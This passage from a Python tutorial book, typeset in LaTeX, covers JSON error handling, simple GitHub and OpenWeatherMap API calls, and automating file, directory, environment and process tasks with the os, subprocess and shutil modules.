    \ControlFlowTok{return}\NormalTok{ dct}

\NormalTok{json\_data }\OperatorTok{=} \StringTok{\textquotesingle{}\{"name": "John", "birthdate": "1990{-}05{-}06T00:00:00"\}\textquotesingle{}}
\NormalTok{parsed\_data }\OperatorTok{=}\NormalTok{ json.loads(json\_data, object\_hook}\OperatorTok{=}\NormalTok{custom\_deserializer)}
\BuiltInTok{print}\NormalTok{(parsed\_data)}
\end{Highlighting}
\end{Shaded}

\subsection{Working with Complex Data
Structures}\label{working-with-complex-data-structures}

The \texttt{json} module can handle complex data structures, including
nested dictionaries and lists. Here's an example of serializing and
deserializing a complex data structure:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}

\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}
    \StringTok{"name"}\NormalTok{: }\StringTok{"John"}\NormalTok{,}
    \StringTok{"age"}\NormalTok{: }\DecValTok{30}\NormalTok{,}
    \StringTok{"address"}\NormalTok{: \{}
        \StringTok{"street"}\NormalTok{: }\StringTok{"123 Main St"}\NormalTok{,}
        \StringTok{"city"}\NormalTok{: }\StringTok{"New York"}
\NormalTok{    \},}
    \StringTok{"phones"}\NormalTok{: [}\StringTok{"123{-}456{-}7890"}\NormalTok{, }\StringTok{"987{-}654{-}3210"}\NormalTok{]}
\NormalTok{\}}

\CommentTok{\# Serialize to JSON}
\NormalTok{json\_data }\OperatorTok{=}\NormalTok{ json.dumps(data, indent}\OperatorTok{=}\DecValTok{4}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(json\_data)}

\CommentTok{\# Deserialize from JSON}
\NormalTok{parsed\_data }\OperatorTok{=}\NormalTok{ json.loads(json\_data)}
\BuiltInTok{print}\NormalTok{(parsed\_data)}
\end{Highlighting}
\end{Shaded}

\section{Error Handling}\label{error-handling-2}

When working with JSON data, you may encounter various errors. The
\texttt{json} module provides specific exceptions to handle these errors
gracefully:

\begin{itemize}
\tightlist
\item
  \texttt{json.JSONDecodeError}: Raised when there is an error decoding
  JSON data.
\item
  \texttt{TypeError}: Raised when there is an error serializing
  non-serializable data.
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}

\CommentTok{\# Handling JSON decoding errors}
\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    json\_data }\OperatorTok{=} \StringTok{\textquotesingle{}\{"name": "John", "age": 30\textquotesingle{}}
\NormalTok{    parsed\_data }\OperatorTok{=}\NormalTok{ json.loads(json\_data)}
\ControlFlowTok{except}\NormalTok{ json.JSONDecodeError }\ImportTok{as}\NormalTok{ e:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Error decoding JSON: }\SpecialCharTok{\{}\NormalTok{e}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\CommentTok{\# Handling serialization errors}
\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    data }\OperatorTok{=}\NormalTok{ \{}\StringTok{"name"}\NormalTok{: }\StringTok{"John"}\NormalTok{, }\StringTok{"age"}\NormalTok{: }\DecValTok{30}\NormalTok{, }\StringTok{"birthdate"}\NormalTok{: }\BuiltInTok{object}\NormalTok{()\}}
\NormalTok{    json\_data }\OperatorTok{=}\NormalTok{ json.dumps(data)}
\ControlFlowTok{except} \PreprocessorTok{TypeError} \ImportTok{as}\NormalTok{ e:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Error serializing data: }\SpecialCharTok{\{}\NormalTok{e}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Practical Examples}\label{practical-examples-3}

\subsection{Example 1: GitHub API}\label{example-1-github-api}

Let's create a script that interacts with the GitHub API to fetch user
information:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}

\KeywordTok{def}\NormalTok{ get\_github\_user(username):}
\NormalTok{    url }\OperatorTok{=} \SpecialStringTok{f"https://api.github.com/users/}\SpecialCharTok{\{}\NormalTok{username}\SpecialCharTok{\}}\SpecialStringTok{"}
\NormalTok{    response }\OperatorTok{=}\NormalTok{ requests.get(url)}
    
    \ControlFlowTok{if}\NormalTok{ response.status\_code }\OperatorTok{==} \DecValTok{200}\NormalTok{:}
\NormalTok{        user\_data }\OperatorTok{=}\NormalTok{ response.json()}
        \ControlFlowTok{return}\NormalTok{ \{}
            \StringTok{"name"}\NormalTok{: user\_data[}\StringTok{"name"}\NormalTok{],}
            \StringTok{"public\_repos"}\NormalTok{: user\_data[}\StringTok{"public\_repos"}\NormalTok{],}
            \StringTok{"followers"}\NormalTok{: user\_data[}\StringTok{"followers"}\NormalTok{]}
\NormalTok{        \}}
    \ControlFlowTok{else}\NormalTok{:}
        \ControlFlowTok{return} \VariableTok{None}

\NormalTok{username }\OperatorTok{=} \StringTok{"octocat"}
\NormalTok{user\_info }\OperatorTok{=}\NormalTok{ get\_github\_user(username)}
\BuiltInTok{print}\NormalTok{(user\_info)}
\end{Highlighting}
\end{Shaded}

\subsection{Example 2: OpenWeatherMap
API}\label{example-2-openweathermap-api}

Let's create a script that interacts with the OpenWeatherMap API to
fetch weather data for a city:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ requests}

\KeywordTok{def}\NormalTok{ get\_weather(city, api\_key):}
\NormalTok{    url }\OperatorTok{=} \SpecialStringTok{f"http://api.openweathermap.org/data/2.5/weather?q=}\SpecialCharTok{\{}\NormalTok{city}\SpecialCharTok{\}}\SpecialStringTok{\&appid=}\SpecialCharTok{\{}\NormalTok{api\_key}\SpecialCharTok{\}}\SpecialStringTok{"}
\NormalTok{    response }\OperatorTok{=}\NormalTok{ requests.get(url)}
    
    \ControlFlowTok{if}\NormalTok{ response.status\_code }\OperatorTok{==} \DecValTok{200}\NormalTok{:}
\NormalTok{        weather\_data }\OperatorTok{=}\NormalTok{ response.json()}
        \ControlFlowTok{return}\NormalTok{ \{}
            \StringTok{"city"}\NormalTok{: weather\_data[}\StringTok{"name"}\NormalTok{],}
            \StringTok{"temperature"}\NormalTok{: weather\_data[}\StringTok{"main"}\NormalTok{][}\StringTok{"temp"}\NormalTok{],}
            \StringTok{"weather"}\NormalTok{: weather\_data[}\StringTok{"weather"}\NormalTok{][}\DecValTok{0}\NormalTok{][}\StringTok{"description"}\NormalTok{]}
\NormalTok{        \}}
    \ControlFlowTok{else}\NormalTok{:}
        \ControlFlowTok{return} \VariableTok{None}

\NormalTok{city }\OperatorTok{=} \StringTok{"London"}
\NormalTok{api\_key }\OperatorTok{=} \StringTok{"your\_api\_key"}
\NormalTok{weather\_info }\OperatorTok{=}\NormalTok{ get\_weather(city, api\_key)}
\BuiltInTok{print}\NormalTok{(weather\_info)}
\end{Highlighting}
\end{Shaded}

\section{Conclusion}\label{conclusion-26}

The \texttt{json} module in Python is a powerful tool for working with
JSON data. It provides simple functions for parsing and serializing JSON
data, handling errors, and customizing the serialization and
deserialization processes. This tutorial covered the basics and advanced
usage of the \texttt{json} module, as well as practical examples of
interacting with APIs. By mastering the \texttt{json} module, you can
easily work with JSON data in your Python applications and effectively
interact with web APIs.

\bookmarksetup{startatroot}

\chapter{Introduction to Automating System Tasks with
Python}\label{introduction-to-automating-system-tasks-with-python}

Automating system tasks with Python can enhance efficiency and reduce
manual errors by performing repetitive tasks programmatically. Python
provides robust libraries for interacting with the operating system,
running external processes, and performing high-level file operations.
This tutorial will cover automating system tasks using the \texttt{os},
\texttt{subprocess}, and \texttt{shutil} libraries.

\subsection{\texorpdfstring{Interacting with the Operating System using
\texttt{os}}{Interacting with the Operating System using os}}\label{interacting-with-the-operating-system-using-os}

The \texttt{os} module provides a way to use operating system-dependent
functionality, including file and directory operations, environment
variables, and system information.

\subsubsection{Working with Directories}\label{working-with-directories}

\paragraph{Example: Creating, Changing, and Removing
Directories}\label{example-creating-changing-and-removing-directories}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ os}

\CommentTok{\# Create a new directory}
\NormalTok{os.mkdir(}\StringTok{\textquotesingle{}new\_directory\textquotesingle{}}\NormalTok{)}

\CommentTok{\# Change the current working directory}
\NormalTok{os.chdir(}\StringTok{\textquotesingle{}new\_directory\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Current Directory: }\SpecialCharTok{\{}\NormalTok{os}\SpecialCharTok{.}\NormalTok{getcwd()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\CommentTok{\# Go back to the parent directory}
\NormalTok{os.chdir(}\StringTok{\textquotesingle{}..\textquotesingle{}}\NormalTok{)}

\CommentTok{\# Remove the created directory}
\NormalTok{os.rmdir(}\StringTok{\textquotesingle{}new\_directory\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Listing Files and
Directories}\label{listing-files-and-directories}

You can list files and directories in a specified directory using
\texttt{os.listdir}.

\paragraph{Example: Listing Files}\label{example-listing-files}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ os}

\CommentTok{\# List files and directories in the current directory}
\NormalTok{items }\OperatorTok{=}\NormalTok{ os.listdir(}\StringTok{\textquotesingle{}.\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Files and Directories in \textquotesingle{}.\textquotesingle{}:"}\NormalTok{, items)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Handling Environment
Variables}\label{handling-environment-variables}

Environment variables are used to store system-wide information.

\paragraph{Example: Accessing Environment
Variables}\label{example-accessing-environment-variables}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ os}

\CommentTok{\# Get the value of the \textquotesingle{}HOME\textquotesingle{} environment variable}
\NormalTok{home\_dir }\OperatorTok{=}\NormalTok{ os.getenv(}\StringTok{\textquotesingle{}HOME\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Home Directory: }\SpecialCharTok{\{}\NormalTok{home\_dir}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\CommentTok{\# Set a new environment variable}
\NormalTok{os.environ[}\StringTok{\textquotesingle{}MY\_VAR\textquotesingle{}}\NormalTok{] }\OperatorTok{=} \StringTok{\textquotesingle{}my\_value\textquotesingle{}}
\BuiltInTok{print}\NormalTok{(}\StringTok{"MY\_VAR:"}\NormalTok{, os.getenv(}\StringTok{\textquotesingle{}MY\_VAR\textquotesingle{}}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{Running External Processes using
\texttt{subprocess}}{Running External Processes using subprocess}}\label{running-external-processes-using-subprocess}

The \texttt{subprocess} module allows you to spawn new processes,
connect to their input/output/error pipes, and obtain their return
codes.

\subsubsection{Running Simple Commands}\label{running-simple-commands}

\paragraph{Example: Running a Shell
Command}\label{example-running-a-shell-command}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ subprocess}

\CommentTok{\# Run a simple command}
\NormalTok{result }\OperatorTok{=}\NormalTok{ subprocess.run([}\StringTok{\textquotesingle{}echo\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Hello, World!\textquotesingle{}}\NormalTok{], capture\_output}\OperatorTok{=}\VariableTok{True}\NormalTok{, text}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Output:"}\NormalTok{, result.stdout)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Running Complex Commands}\label{running-complex-commands}

\paragraph{Example: Running a Command and Capturing
Output}\label{example-running-a-command-and-capturing-output}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ subprocess}

\CommentTok{\# Run a command and capture its output}
\NormalTok{result }\OperatorTok{=}\NormalTok{ subprocess.run([}\StringTok{\textquotesingle{}ls\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}{-}l\textquotesingle{}}\NormalTok{], capture\_output}\OperatorTok{=}\VariableTok{True}\NormalTok{, text}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Output:}\CharTok{\textbackslash{}n}\StringTok{"}\NormalTok{, result.stdout)}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{High-Level File Operations using
\texttt{shutil}}{High-Level File Operations using shutil}}\label{high-level-file-operations-using-shutil}

The \texttt{shutil} module provides a higher-level interface for file
operations, including copying, moving, and removing files and
directories.

\subsubsection{Copying Files and
Directories}\label{copying-files-and-directories}

\paragraph{Example: Copying Files}\label{example-copying-files}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ shutil}

\CommentTok{\# Copy a file}
\NormalTok{shutil.copy(}\StringTok{\textquotesingle{}source\_file.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}destination\_file.txt\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\paragraph{Example: Copying
Directories}\label{example-copying-directories}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ shutil}

\CommentTok{\# Copy a directory}
\NormalTok{shutil.copytree(}\StringTok{\textquotesingle{}source\_directory\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}destination\_directory\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Moving and Renaming
Files}\label{moving-and-renaming-files}

\paragraph{Example: Moving Files}\label{example-moving-files}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ shutil}

\CommentTok{\# Move a file}
\NormalTok{shutil.move(}\StringTok{\textquotesingle{}source\_file.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}destination\_directory/source\_file.txt\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\paragraph{Example: Renaming Files}\label{example-renaming-files}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ shutil}

\CommentTok{\# Rename a file}
\NormalTok{shutil.move(}\StringTok{\textquotesingle{}old\_name.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}new\_name.txt\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Removing Files and
Directories}\label{removing-files-and-directories}

\paragraph{Example: Removing Files}\label{example-removing-files}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ os}

\CommentTok{\# Remove a file}
\NormalTok{os.remove(}\StringTok{\textquotesingle{}file\_to\_remove.txt\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\paragraph{Example: Removing
Directories}\label{example-removing-directories}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ shutil}

\CommentTok{\# Remove a directory}
\NormalTok{shutil.rmtree(}\StringTok{\textquotesingle{}directory\_to\_remove\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Example: Automating a Backup
Process}\label{example-automating-a-backup-process}

Let's combine what we've learned to automate a simple backup process.
We'll create a script that copies files from a source directory to a
backup directory, adding a timestamp to the backup directory name.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ os}
\ImportTok{import}\NormalTok{ shutil}
\ImportTok{import}\NormalTok{ datetime}

\KeywordTok{def}\NormalTok{ backup\_files(source\_dir, backup\_root):}
    \CommentTok{\# Create a timestamped backup directory}
\NormalTok{    timestamp }\OperatorTok{=}\NormalTok{ datetime.datetime.now().strftime(}\StringTok{\textquotesingle{}\%Y\%m}\SpecialCharTok{\%d}\StringTok{\%H\%M\%S\textquotesingle{}}\NormalTok{)}
\NormalTok{    backup\_dir }\OperatorTok{=}\NormalTok{ os.path.join(backup\_root, }\SpecialStringTok{f\textquotesingle{}backup\_}\SpecialCharTok{\{}\NormalTok{timestamp}\SpecialCharTok{\}}\SpecialStringTok{\textquotesingle{}}\NormalTok{)}
\NormalTok{    os.makedirs(backup\_dir)}
    
    \CommentTok{\# Copy all files from the source directory to the backup directory}
    \ControlFlowTok{for}\NormalTok{ item }\KeywordTok{in}\NormalTok{ os.listdir(source\_dir):}
\NormalTok{        source\_item }\OperatorTok{=}\NormalTok{ os.path.join(source\_dir, item)}
\NormalTok{        backup\_item }\OperatorTok{=}\NormalTok{ os.path.join(backup\_dir, item)}
        \ControlFlowTok{if}\NormalTok{ os.path.isdir(source\_item):}
\NormalTok{            shutil.copytree(source\_item, backup\_item)}
        \ControlFlowTok{else}\NormalTok{:}
\NormalTok{            shutil.copy2(source\_item, backup\_item)}
    
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Backup completed: }\SpecialCharTok{\{}\NormalTok{backup\_dir}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\CommentTok{\# Define the source and backup directories}
\NormalTok{source\_directory }\OperatorTok{=} \StringTok{\textquotesingle{}source\_directory\textquotesingle{}}
\NormalTok{backup\_directory }\OperatorTok{=} \StringTok{\textquotesingle{}backup\_directory\textquotesingle{}}

\CommentTok{\# Perform the backup}
\NormalTok{backup\_files(source\_directory, backup\_directory)}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-27}

Automating system tasks with Python can save time and reduce errors by
performing repetitive tasks programmatically. The \texttt{os},
\texttt{subprocess}, and \texttt{shutil} libraries provide powerful
tools for interacting with the operating system, running external
processes, and handling files and directories. By mastering these
libraries, you can automate a wide range of system tasks, enhancing your
efficiency and productivity.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive into the \texttt{os} Module in
Python}{Deep Dive into the os Module in Python}}\label{deep-dive-into-the-os-module-in-python}

The \texttt{os} module in Python provides a way of using operating
system-dependent functionality like reading or writing to the file
system. The \texttt{os} module also allows you to interface with the
underlying operating system that Python is running on, whether it's
Windows, Mac, or Linux. Let's explore the \texttt{os} module in detail.

\section{\texorpdfstring{Importing the \texttt{os}
Module}{Importing the os Module}}\label{importing-the-os-module}

To use the \texttt{os} module, you need to import it first:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ os}
\end{Highlighting}
\end{Shaded}

\section{File and Directory
Operations}\label{file-and-directory-operations}

\subsection{Working with Directories}\label{working-with-directories-1}

\subsubsection{Get Current Working
Directory}\label{get-current-working-directory}

You can get the current working directory using \texttt{os.getcwd()}:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ os}

\NormalTok{current\_directory }\OperatorTok{=}\NormalTok{ os.getcwd()}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Current Directory:"}\NormalTok{, current\_directory)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Change Directory}\label{change-directory}

You can change the current working directory using
\texttt{os.chdir(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{os.chdir(}\StringTok{\textquotesingle{}/path/to/directory\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Changed Directory:"}\NormalTok{, os.getcwd())}
\end{Highlighting}
\end{Shaded}

\subsubsection{List Directory Contents}\label{list-directory-contents}

To list the contents of a directory, use \texttt{os.listdir(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{directory\_contents }\OperatorTok{=}\NormalTok{ os.listdir(}\StringTok{\textquotesingle{}.\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Directory Contents:"}\NormalTok{, directory\_contents)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Create a Directory}\label{create-a-directory}

You can create a new directory using \texttt{os.mkdir(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{os.mkdir(}\StringTok{\textquotesingle{}new\_directory\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"New Directory Created:"}\NormalTok{, os.listdir(}\StringTok{\textquotesingle{}.\textquotesingle{}}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsubsection{Create Intermediate
Directories}\label{create-intermediate-directories}

To create intermediate directories, use \texttt{os.makedirs(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{os.makedirs(}\StringTok{\textquotesingle{}parent\_directory/child\_directory\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Directories Created:"}\NormalTok{, os.listdir(}\StringTok{\textquotesingle{}parent\_directory\textquotesingle{}}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsubsection{Remove a Directory}\label{remove-a-directory}

To remove a directory, use \texttt{os.rmdir(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{os.rmdir(}\StringTok{\textquotesingle{}new\_directory\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Directory Removed:"}\NormalTok{, os.listdir(}\StringTok{\textquotesingle{}.\textquotesingle{}}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

To remove intermediate directories, use \texttt{os.removedirs(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{os.removedirs(}\StringTok{\textquotesingle{}parent\_directory/child\_directory\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Directories Removed:"}\NormalTok{, os.listdir(}\StringTok{\textquotesingle{}.\textquotesingle{}}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsection{Working with Files}\label{working-with-files}

\subsubsection{Create and Write to a
File}\label{create-and-write-to-a-file}

To create and write to a file, you can use standard file handling
methods:

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}example.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
    \BuiltInTok{file}\NormalTok{.write(}\StringTok{\textquotesingle{}Hello, World!\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File Created and Written to:"}\NormalTok{, os.listdir(}\StringTok{\textquotesingle{}.\textquotesingle{}}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsubsection{Remove a File}\label{remove-a-file}

To remove a file, use \texttt{os.remove(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{os.remove(}\StringTok{\textquotesingle{}example.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File Removed:"}\NormalTok{, os.listdir(}\StringTok{\textquotesingle{}.\textquotesingle{}}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsubsection{Rename a File}\label{rename-a-file}

To rename a file, use \texttt{os.rename(src,\ dst)}:

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}old\_name.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
    \BuiltInTok{file}\NormalTok{.write(}\StringTok{\textquotesingle{}Hello, World!\textquotesingle{}}\NormalTok{)}

\NormalTok{os.rename(}\StringTok{\textquotesingle{}old\_name.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}new\_name.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File Renamed:"}\NormalTok{, os.listdir(}\StringTok{\textquotesingle{}.\textquotesingle{}}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsubsection{Get File Status}\label{get-file-status}

To get the status of a file, use \texttt{os.stat(path)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{file\_status }\OperatorTok{=}\NormalTok{ os.stat(}\StringTok{\textquotesingle{}new\_name.txt\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"File Status:"}\NormalTok{, file\_status)}
\end{Highlighting}
\end{Shaded}

\section{Environment Variables}\label{environment-variables}

\subsection{Get Environment Variables}\label{get-environment-variables}

To get the value of an environment variable, use
\texttt{os.environ.get(key)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{home\_directory }\OperatorTok{=}\NormalTok{ os.environ.get(}\StringTok{\textquotesingle{}HOME\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Home Directory:"}\NormalTok{, home\_directory)}
\end{Highlighting}
\end{Shaded}

\subsection{Set Environment Variables}\label{set-environment-variables}

To set the value of an environment variable, use
\texttt{os.environ{[}key{]}\ =\ value}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{os.environ[}\StringTok{\textquotesingle{}MY\_VARIABLE\textquotesingle{}}\NormalTok{] }\OperatorTok{=} \StringTok{\textquotesingle{}my\_value\textquotesingle{}}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Environment Variable Set:"}\NormalTok{, os.environ.get(}\StringTok{\textquotesingle{}MY\_VARIABLE\textquotesingle{}}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsection{Delete Environment
Variables}\label{delete-environment-variables}

To delete an environment variable, use
\texttt{os.environ.pop(key,\ default)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{os.environ.pop(}\StringTok{\textquotesingle{}MY\_VARIABLE\textquotesingle{}}\NormalTok{, }\VariableTok{None}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Environment Variable Deleted:"}\NormalTok{, os.environ.get(}\StringTok{\textquotesingle{}MY\_VARIABLE\textquotesingle{}}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\section{Process Management}\label{process-management}

\subsection{Get Process ID}\label{get-process-id}

To get the current process ID, use \texttt{os.getpid()}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{process\_id }\OperatorTok{=}\NormalTok{ os.getpid()}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Process ID:"}\NormalTok{, process\_id)}
\end{Highlighting}
\end{Shaded}

\subsection{Get Parent Process ID}\label{get-parent-process-id}

To get the parent process ID, use \texttt{os.getppid()}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{parent\_process\_id }\OperatorTok{=}\NormalTok{ os.getppid()}
\BuiltInTok{print}\NormalTok{(}\StringTok{"Parent Process ID:"}\NormalTok{, parent\_process\_id)}
\end{Highlighting}
\end{Shaded}

\subsection{Fork a Process}\label{fork-a-process}

To fork a process (UNIX only), use \texttt{os.fork()}:

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    pid }\OperatorTok{=}\NormalTok{ os.fork()}
    \ControlFlowTok{if}\NormalTok{ pid }\OperatorTok{\textgreater{}} \DecValTok{0}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Parent process ID:"}\NormalTok{, os.getpid())}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Child process ID:"}\NormalTok{, pid)}
    \ControlFlowTok{else}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Child process ID:"}\NormalTok{, os.getpid())}
        \BuiltInTok{print}\NormalTok{(}\StringTok{"Parent process ID:"}\NormalTok{, os.getppid())}
\ControlFlowTok{except} \PreprocessorTok{AttributeError}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Fork not available on this operating system"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Execute a Program}\label{execute-a-program}

To replace the current process with a new one, use \texttt{os.exec*()}
methods. For example, \texttt{os.execl(path,\ arg0,\ arg1,\ ...)}:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ sys}

\ControlFlowTok{if} \BuiltInTok{len}\NormalTok{(sys.argv) }\OperatorTok{==} \DecValTok{1}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Starting new process"}\NormalTok{)}
\NormalTok{    os.execl(sys.executable, sys.executable, }\OperatorTok{*}\NormalTok{sys.argv, }\StringTok{\textquotesingle{}child\textquotesingle{}}\NormalTok{)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Running in child process"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Wait for a Child Process}\label{wait-for-a-child-process}

To wait for a child process to terminate, use \texttt{os.wait()}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{pid }\OperatorTok{=}\NormalTok{ os.fork()}
\ControlFlowTok{if}\NormalTok{ pid }\OperatorTok{\textgreater{}} \DecValTok{0}\NormalTok{:}
\NormalTok{    os.wait()}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"Child process terminated"}\NormalTok{)}
\ControlFlowTok{else}\NormalTok{:}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"In child process"}\NormalTok{)}
\NormalTok{    sys.exit(}\DecValTok{0}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Miscellaneous OS Operations}\label{miscellaneous-os-operations}

\subsection{Get OS Name}\label{get-os-name}

To get the name of the operating system, use \texttt{os.name}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{os\_name }\OperatorTok{=}\NormalTok{ os.name}
\BuiltInTok{print}\NormalTok{(}\StringTok{"OS Name:"}\NormalTok{, os\_name)}
\end{Highlighting}
\end{Shaded}

\subsection{Execute a System Command}\label{execute-a-system-command}

To execute a system command, use \texttt{os.system(command)}:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{os.system(}\StringTok{\textquotesingle{}echo Hello, World!\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

